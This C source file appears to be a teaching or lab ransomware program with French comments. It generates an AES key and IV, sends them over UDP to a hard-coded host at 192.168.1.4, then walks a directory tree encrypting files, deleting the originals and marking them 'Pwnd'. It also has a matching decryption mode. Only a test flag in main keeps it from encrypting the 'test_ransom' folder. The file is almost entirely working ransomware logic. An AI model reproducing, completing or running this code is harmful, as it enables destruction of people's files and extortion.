#include "ransomlib.h"
#include <dirent.h>

#include <openssl/rand.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>

#define OPENSSL_KEY_SIZE (256 / 8) //car Rand_bytes génère des bytes (octets) et pas bits
#define OPENSSL_IV_SIZE (128 / 8)
#define SIZE 1024

void usage();
int is_encrypted(char *filename);
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
int send_key(char *pKey, char *pIv);
int recv_key(int, struct sockaddr_in server_address);

int is_encrypted(char *filename){
	char *token = strtok(filename, ".");

	while(token != NULL){
		if(strcmp(token, "Pwnd") == 0){
			return 1;
		}
		token = strtok(NULL, ".");
	}
	return 0;
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){
	DIR *dir;
	struct dirent *entry;

	char path[1024];//taille arbitraire

	dir = opendir(name);
	if(dir == NULL){
		printf("resultat NULL\n");
		return;
	}

	if(de_flag == 't'){
		printf("INFO:LIST_DIR_ENCRYPTING] : Software in testing mod\n");
		return;
	}

	//dessiner bout de code de récurtion (sous forme d'arbre)
	while((entry = readdir(dir)) != NULL){
		snprintf(path, sizeof(path), "%s/%s", name, entry -> d_name);
		printf("%s\n", path);

		if(entry -> d_type == DT_DIR){
			if(strcmp(entry -> d_name, ".") == 0 || strcmp(entry -> d_name, "..") == 0){
				continue;
			}
			listdir(path, iv, key, de_flag);
		}
		else{
			if(de_flag == 'e'){
				if(is_encrypted(path) == 1){
					continue;
				}
				encrypt(key, iv, path);
				remove(path);
			}
			else if(de_flag == 'd'){
				if(is_encrypted(path) == 0){
					continue;
				}
				decrypt(key, iv, path);
				remove(path);
			}
			else{
				printf("Wrong argument of encryption/decryption !\n");
			}
		}
	}

	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv, char *pKey, char *pIv){
	if (!RAND_bytes(key, OPENSSL_KEY_SIZE)) {
    	printf("OpenSSL reports a failure during key generation !");
	}
	if (!RAND_bytes(iv, OPENSSL_IV_SIZE)) {
    	printf("OpenSSL reports a failure during iv generation !");
	}

	bytes_to_hexa(key, pKey, OPENSSL_KEY_SIZE + 1);
	bytes_to_hexa(iv, pIv, OPENSSL_IV_SIZE + 1);

	send_key(pKey, pIv);
}

int send_key(char *pKey, char *pIv){
	int sockid;
	int server_port = 8888;
	char *server_ip = "192.168.1.4";

	sockid = socket(AF_INET, SOCK_DGRAM, 0);

	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(server_port);
	server_addr.sin_addr.s_addr = inet_addr(server_ip);

	int bind_result = bind(sockid, (struct sockaddr *) &server_addr, sizeof(server_addr));

	char msg[((OPENSSL_KEY_SIZE * 2) + (OPENSSL_IV_SIZE * 2) + 3)];
	snprintf(msg, sizeof(msg), "%s | %s", pKey, pIv);

	sendto(sockid, (const char *)msg, strlen(msg), 0, (const struct sockaddr *) &server_addr, sizeof(server_addr));
	
	recv_key(sockid, server_addr);
}

int recv_key(int sockid, struct sockaddr_in server_addr){
	int len = sizeof(server_addr);
	char *buffer[SIZE];

	printf("%s\n", inet_ntoa(server_addr.sin_addr));
	printf("%d\n", server_addr.sin_port);

	recvfrom(sockid, (char *)buffer, SIZE, MSG_WAITALL, (struct sockaddr *) &server_addr, &len);
	printf("%s\n", buffer);

	close(sockid);
}

int main (int argc, char * argv[]){
	unsigned char key[OPENSSL_KEY_SIZE + 1];
	unsigned char iv[OPENSSL_IV_SIZE + 1];

	char pKey[(OPENSSL_KEY_SIZE * 2) + 1];
	char pIv[(OPENSSL_IV_SIZE * 2) + 1];

	const char *name = "test_ransom";
	char de_flag = 't';

	generate_key(key, OPENSSL_KEY_SIZE, iv, OPENSSL_IV_SIZE, pKey, pIv);
	listdir(name, iv, key, de_flag);
}